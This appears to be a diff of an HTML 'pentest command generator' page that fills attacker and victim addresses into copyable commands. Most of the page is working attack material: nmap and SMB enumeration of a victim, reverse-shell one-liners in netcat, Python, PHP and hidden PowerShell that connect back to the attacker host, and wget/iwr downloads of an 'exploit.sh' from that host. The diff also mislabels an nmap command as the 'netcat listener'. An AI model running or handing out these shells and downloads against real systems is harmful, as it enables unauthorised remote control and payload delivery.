@@ -2,7 +2,7 @@
 <html lang="en">
 
 <head>
-    <title>Pentest command generator</title>
+    <title>interactive hacking cheatsheet</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
@@ -10,17 +10,53 @@
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.4/clipboard.min.js"></script>
 
+<style>
+	body {
+		font-family: Lucida Console;
+		color: green;
+		background-color: black;
+	}
+
+	pre {
+		background-color: black;
+		color: white;
+		border-color: white;	
+	}
+
+	input[type="text"], textarea {
+		background-color : black;
+		border-color: gray;
+		color: red;
+	}
+
+	button {
+		color: gray;
+		background-color: black
+	}
+
+	.nav {
+
+		  border-bottom: 1px solid black;
+	}
+
+	.nav>li>a {
+		background-color: black !important;
+		color: gray;
+		border-radius: 0;
+		border-bottom: 1px solid white;
+	}
+</style>
 </head>
 
 <body>
     <div class="container">
         <div class="row">
-            <div class="col-md-6">
-                <h1>Pentest command generator</h1>
-                <p>Interactive hacking cheatsheet</p>
+            <div class="col-md-9">
+                <h1>interactive hacking cheatsheet</h1>
+                <p>pentest command generator</p>
+				<hr/>
             </div>
         </div>
-        <hr />
         <div class="row">
             <div class="col-md-2">
                 <div class="form-group">
@@ -28,7 +64,7 @@
                     <label for="victimHostInput">Victim Host</label>
                     <input type="text" class="form-control" id="victimHostInput" placeholder="Victim's address"
                         value="127.0.0.1" onchange="loadCommands()">
-                    <label for="attackerHostInput">Attacker Host</label>
+                    <label for="attackerHostInput" style="margin-top: 10px">Attacker Host</label>
                     <input type="text" class="form-control" id="attackerHostInput" placeholder="Attacker's address"
                         value="127.0.0.1" onchange="loadCommands()">
                 </div>
@@ -39,7 +75,7 @@
                     <label for="victimPortInput">Port</label>
                     <input type="text" class="form-control" id="victimPortInput" placeholder="Victim's address"
                         value="1234" onchange="loadCommands()">
-                    <label for="attackevictimPortInput">Port</label>
+                    <label for="attackevictimPortInput" style="margin-top: 10px">Port</label>
                     <input type="text" class="form-control" id="attackerPortInput" placeholder="Victim's address"
                         value="1234" onchange="loadCommands()">
                 </div>
@@ -66,78 +102,99 @@
 
         </div>
         <ul class="nav nav-tabs">
-            <li class="active"><a data-toggle="tab" href="#enum">enum</a></li>
+            
+            <li><a data-toggle="tab" href="#enum">enum</a></li>
+            
             <li><a data-toggle="tab" href="#shells">shells</a></li>
+            
             <li><a data-toggle="tab" href="#http">http</a></li>
+            
             <li><a data-toggle="tab" href="#misc">misc</a></li>
+            
             <li><a data-toggle="tab" href="#links">links</a></li>
+            
         </ul>
+
+
         <div class="col-md-9">
             <div class="tab-content">
                 <div id="enum" class="tab-pane fade in active">
-
-
+                    
                     <div class="row">
                         <h2>nmap</h2>
-                        <pre><code id="nmap1"></code></pre>
-                        <button class="btn" data-clipboard-target="#nmap1">
-                            <span class="glyphicon glyphicon-copy"></span>
-                        </button>
-                        <button class="btn" data-toggle="tooltip"
-                            title="Perform an aggresive  all ports scan with at least 1000 packets per seconds and the save result to variable 'ports' "
-                            data-placement="bottom">
-                            <span class="glyphicon glyphicon-question-sign"></span>
-                        </button>
                     </div>
-
-
-
+                    
+					
+                    
                     <div class="row">
-                        <pre><code id="nmap2"></code></pre>
-
-                        <button class="btn" data-clipboard-target="#nmap2">
+                        <pre style="margin-top: 10px"><code id="enum_nmap1"></code></pre>
+                        <button class="btn" data-clipboard-target="#enum_nmap1">
                             <span class="glyphicon glyphicon-copy"></span>
                         </button>
-                        <button class="btn" data-toggle="tooltip"
-                            title="Perform a version detection scan (-sV) of opened ports, with most common scripts enabled (-sC)."
-                            data-placement="bottom">
+                        <button class="btn" data-toggle="tooltip" title="scan victim ports " data-placement="bottom">
                             <span class="glyphicon glyphicon-question-sign"></span>
                         </button>
                     </div>
+                    
+					
+                    
                     <div class="row">
-                        <h2>enum4linux</h2>
-                        <pre><code id="enum4linux"></code></pre>
-                        <button class="btn" data-clipboard-target="#enum4linux">
+                        <pre style="margin-top: 10px"><code id="enum_nmap2"></code></pre>
+                        <button class="btn" data-clipboard-target="#enum_nmap2">
                             <span class="glyphicon glyphicon-copy"></span>
                         </button>
-                        <button class="btn" data-toggle="tooltip"
-                            title="Perform an overall enumaration of a Windows target host." data-placement="bottom">
+                        <button class="btn" data-toggle="tooltip" title="scan victim ports 2 " data-placement="bottom">
                             <span class="glyphicon glyphicon-question-sign"></span>
                         </button>
                     </div>
+                    
+                    
                     <div class="row">
                         <h2>smb</h2>
-                        <pre><code id="smbclient1"></code></pre>
-
-                        <button class="btn" data-clipboard-target="#smbclient1">
-                            <span class="glyphicon glyphicon-copy"></span>
-                        </button>
-                        <button class="btn" data-toggle="tooltip"
-                            title="Try to list SMB shares as an unauthenticated user." data-placement="bottom">
-                            <span class="glyphicon glyphicon-question-sign"></span>
-                        </button>
                     </div>
+                    
+					
+                    
                     <div class="row">
-                        <pre><code id="smbmap1"></code></pre>
-
-                        <button class="btn" data-clipboard-target="#smbmap1">
+                        <pre style="margin-top: 10px"><code id="enum_smb1"></code></pre>
+                        <button class="btn" data-clipboard-target="#enum_smb1">
                             <span class="glyphicon glyphicon-copy"></span>
                         </button>
-                        <button class="btn" data-toggle="tooltip" title="Enumerate SMB share." data-placement="bottom">
+                        <button class="btn" data-toggle="tooltip" title="unauthenticated enumeration of SMB shares " data-placement="bottom">
                             <span class="glyphicon glyphicon-question-sign"></span>
                         </button>
                     </div>
-
+                    
+					
+                    
+                    <div class="row">
+                        <pre style="margin-top: 10px"><code id="enum_smb2"></code></pre>
+                        <button class="btn" data-clipboard-target="#enum_smb2">
+                            <span class="glyphicon glyphicon-copy"></span>
+                        </button>
+                        <button class="btn" data-toggle="tooltip" title="enumeration of smb " data-placement="bottom">
+                            <span class="glyphicon glyphicon-question-sign"></span>
+                        </button>
+                    </div>
+                    
+                    
+                    <div class="row">
+                        <h2>enum4linux</h2>
+                    </div>
+                    
+					
+                    
+                    <div class="row">
+                        <pre style="margin-top: 10px"><code id="enum_enum4linux1"></code></pre>
+                        <button class="btn" data-clipboard-target="#enum_enum4linux1">
+                            <span class="glyphicon glyphicon-copy"></span>
+                        </button>
+                        <button class="btn" data-toggle="tooltip" title=" " data-placement="bottom">
+                            <span class="glyphicon glyphicon-question-sign"></span>
+                        </button>
+                    </div>
+                    
+                    
 
                 </div>
 
@@ -146,43 +203,79 @@
                 <div id="shells" class="tab-pane fade">
 
 
-                    <div class="row">
-
-                        <h2>netcat listener</h2>
-                        <pre><code id="nc1"></code></pre>
-                        <button class="btn" data-clipboard-target="#nc1">
-                            <span class="glyphicon glyphicon-copy"></span>
-                        </button>
-                        <h2>python</h2>
-                        <pre><code id="python_shell1"></code></pre>
-                        <button class="btn" data-clipboard-target="#python_shell1">
-                            <span class="glyphicon glyphicon-copy"></span>
-                        </button>
-                    </div>
+                    
 
                     <div class="row">
                         <h2>netcat</h2>
-                        <pre><code id="nc_shell1"></code></pre>
-                        <button class="btn" data-clipboard-target="#nc_shell1">
+                    </div>
+                    
+					
+                    
+                    <div class="row">
+                        <pre style="margin-top: 10px"><code id="shells_netcat1"></code></pre>
+                        <button class="btn" data-clipboard-target="#shells_netcat1">
                             <span class="glyphicon glyphicon-copy"></span>
                         </button>
+                        <button class="btn" data-toggle="tooltip" title=" " data-placement="bottom">
+                            <span class="glyphicon glyphicon-question-sign"></span>
+                        </button>
                     </div>
+                    
+                    
+
+                    <div class="row">
+                        <h2>python</h2>
+                    </div>
+                    
+					
+                    
+                    <div class="row">
+                        <pre style="margin-top: 10px"><code id="shells_python1"></code></pre>
+                        <button class="btn" data-clipboard-target="#shells_python1">
+                            <span class="glyphicon glyphicon-copy"></span>
+                        </button>
+                        <button class="btn" data-toggle="tooltip" title="python reverse shell " data-placement="bottom">
+                            <span class="glyphicon glyphicon-question-sign"></span>
+                        </button>
+                    </div>
+                    
+                    
 
                     <div class="row">
                         <h2>php</h2>
-                        <pre><code id="php_shell1"></code></pre>
-                        <button class="btn" data-clipboard-target="#php_shell1">
+                    </div>
+                    
+					
+                    
+                    <div class="row">
+                        <pre style="margin-top: 10px"><code id="shells_php1"></code></pre>
+                        <button class="btn" data-clipboard-target="#shells_php1">
                             <span class="glyphicon glyphicon-copy"></span>
                         </button>
+                        <button class="btn" data-toggle="tooltip" title="php reverse shell " data-placement="bottom">
+                            <span class="glyphicon glyphicon-question-sign"></span>
+                        </button>
                     </div>
+                    
+                    
 
                     <div class="row">
                         <h2>powershell</h2>
-                        <pre><code id="powershell_shell1"></code></pre>
-                        <button class="btn" data-clipboard-target="#powershell_shell1">
+                    </div>
+                    
+					
+                    
+                    <div class="row">
+                        <pre style="margin-top: 10px"><code id="shells_powershell1"></code></pre>
+                        <button class="btn" data-clipboard-target="#shells_powershell1">
                             <span class="glyphicon glyphicon-copy"></span>
                         </button>
+                        <button class="btn" data-toggle="tooltip" title="powershell reverse shell " data-placement="bottom">
+                            <span class="glyphicon glyphicon-question-sign"></span>
+                        </button>
                     </div>
+                    
+                    
 
                 </div>
 
@@ -190,52 +283,99 @@
                 <div id="http" class="tab-pane fade">
                     <div class="row">
                         <h2>file name</h2>
-                        
-                            
-                            <div class="form-group">
-                                
-                                <input type="text" class="form-control" id="filename" placeholder="File name"
-                                    value="exploit.sh" onchange="loadCommands()">
-                            
+
+
+                        <div class="form-group">
+
+                            <input type="text" class="form-control" id="filename" placeholder="File name"
+                                value="exploit.sh" onchange="loadCommands()">
+
                         </div>
                     </div>
+                    
+
                     <div class="row">
                         <h2>wget</h2>
-                        <pre><code id="wget"></code></pre>
-                        <button class="btn" data-clipboard-target="#wget">
+                    </div>
+                    
+					
+                    
+                    <div class="row">
+                        <pre style="margin-top: 10px"><code id="http_wget1"></code></pre>
+                        <button class="btn" data-clipboard-target="#http_wget1">
                             <span class="glyphicon glyphicon-copy"></span>
                         </button>
+                        <button class="btn" data-toggle="tooltip" title="wget a file " data-placement="bottom">
+                            <span class="glyphicon glyphicon-question-sign"></span>
+                        </button>
                     </div>
+                    
+                    
+
                     <div class="row">
                         <h2>powershell</h2>
-                        <pre><code id="powershell_file1"></code></pre>
-                        <button class="btn" data-clipboard-target="#powershell_file1">
+                    </div>
+                    
+					
+                    
+                    <div class="row">
+                        <pre style="margin-top: 10px"><code id="http_powershell1"></code></pre>
+                        <button class="btn" data-clipboard-target="#http_powershell1">
                             <span class="glyphicon glyphicon-copy"></span>
                         </button>
+                        <button class="btn" data-toggle="tooltip" title="wget a file " data-placement="bottom">
+                            <span class="glyphicon glyphicon-question-sign"></span>
+                        </button>
                     </div>
+                    
+                    
                 </div>
+
+
+
                 <div id="misc" class="tab-pane fade">
+
+                    
+
                     <div class="row">
-                        <h2>tty shell</h2>
-                        <h4>python</h4>
-                        <pre><code id="tty1">python -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
-                        <button class="btn" data-clipboard-target="#tty1">
+                        <h2>tty shells</h2>
+                    </div>
+                    
+					
+					<div class="row">
+						<h4>python </h4>
+					</div>
+					
+                    
+                    <div class="row">
+                        <pre style="margin-top: 10px"><code id="misc_tty_shells1"></code></pre>
+                        <button class="btn" data-clipboard-target="#misc_tty_shells1">
                             <span class="glyphicon glyphicon-copy"></span>
                         </button>
-                        <h4>script</h4>
-                        <pre><code id="tty2">/usr/bin/script -qc /bin/bash /dev/null</code></pre>
-                        <button class="btn" data-clipboard-target="#tty2">
-                            <span class="glyphicon glyphicon-copy"></span>
+                        <button class="btn" data-toggle="tooltip" title="spawn a tty shell " data-placement="bottom">
+                            <span class="glyphicon glyphicon-question-sign"></span>
                         </button>
                     </div>
+                    
+                    
+
                     <div class="row">
-                        <h2>interactive shell</h2>
-                        <h4> use Ctrl+z first</h4>
-                        <pre><code id="interactive">stty raw -echo; fg; reset</code></pre>
-                        <button class="btn" data-clipboard-target="#interactive">
+                        <h2>netcat listener</h2>
+                    </div>
+                    
+					
+                    
+                    <div class="row">
+                        <pre style="margin-top: 10px"><code id="misc_netcat_listener1"></code></pre>
+                        <button class="btn" data-clipboard-target="#misc_netcat_listener1">
                             <span class="glyphicon glyphicon-copy"></span>
                         </button>
+                        <button class="btn" data-toggle="tooltip" title=" " data-placement="bottom">
+                            <span class="glyphicon glyphicon-question-sign"></span>
+                        </button>
                     </div>
+                    
+                    
                 </div>
                 <div id="links" class="tab-pane fade">
                     <div class="row">
@@ -284,26 +424,76 @@
         var attackerPort = document.getElementById("attackerPortInput").value
         var filename = document.getElementById("filename").value
 
-
         var commands = {
-            "nmap1": `ports=$(nmap -p- --min-rate=1000 -T4 ${victimHost} | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)`,
-            "nmap2": `nmap -sC -sV -p$ports ${victimHost}`,
-            "python_shell1": `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${attackerHost}",${attackerPort}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`,
-            "nc1": `nc -lnvp ${attackerPort}`,
-            "nc_shell1": `nc ${attackerHost} ${attackerPort} –e /bin/bash`,
-            "php_shell1": `php -r '$sock=fsockopen("${attackerHost}",${attackerPort});exec("/bin/sh -i <&3 >&3 2>&3");'`,
-            "powershell_shell1": `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${attackerHost}",${attackerPort});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
-            "smbclient1": `smbclient -L //${victimHost} -N`,
-            "smbmap1": `smbmap -H ${victimHost}`,
-            "enum4linux": `enum4linux ${victimHost}`,
-            "wget": `wget http://${attackerHost}:${attackerPort}/${filename}`,
-            "powershell_file1": `iwr http://${attackerHost}:${attackerPort}/${filename} -outfile .\\${filename}`
+            
+        
+        
+        "enum_nmap1": `ports=$(nmap -p- --min-rate=1000 -T4 ${victimHost} | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`,
+            
+        "enum_nmap2": `nmap -sC -sV -p$ports ${victimHost}`,
+            
+    
+        
+        "enum_smb1": `smbclient -L //${victimHost} -N`,
+            
+        "enum_smb2": `smbmap -H ${victimHost}`,
+            
+    
+        
+        "enum_enum4linux1": `enum4linux ${victimHost}`,
+            
+    
+    
+        
+        
+        "shells_netcat1": `nc ${attackerHost} ${attackerPort} –e /bin/bash`,
+            
+    
+        
+        "shells_python1": `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${attackerHost}",${attackerPort}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`,
+            
+    
+        
+        "shells_php1": `php -r '$sock=fsockopen("${attackerHost}",${attackerPort});exec("/bin/sh -i <&3 >&3 2>&3");'`,
+            
+    
+        
+        "shells_powershell1": `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${attackerHost}",${attackerPort});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
+            
+    
+    
+        
+        
+        "http_wget1": `wget http://${attackerHost}:${attackerPort}/${filename}`,
+            
+    
+        
+        "http_powershell1": `iwr http://${attackerHost}:${attackerPort}/${filename} -outfile .\${filename}`,
+            
+    
+    
+        
+        
+        "misc_tty_shells1": `python -c 'import pty;pty.spawn("/bin/bash")'`,
+            
+    
+        
+        "misc_netcat_listener1": `nmap -sC -sV -p$ports ${victimHost}`,
+            
+    
+    
+        
+    
+
         }
 
-        for (var commandId in commands) {
-            document.getElementById(commandId).innerText = commands[commandId]
-        }
+
+    for (var commandId in commands) {
+        console.log(commandId)
+        document.getElementById(commandId).innerText = commands[commandId]
     }
+}
+
 
     loadCommands()
 
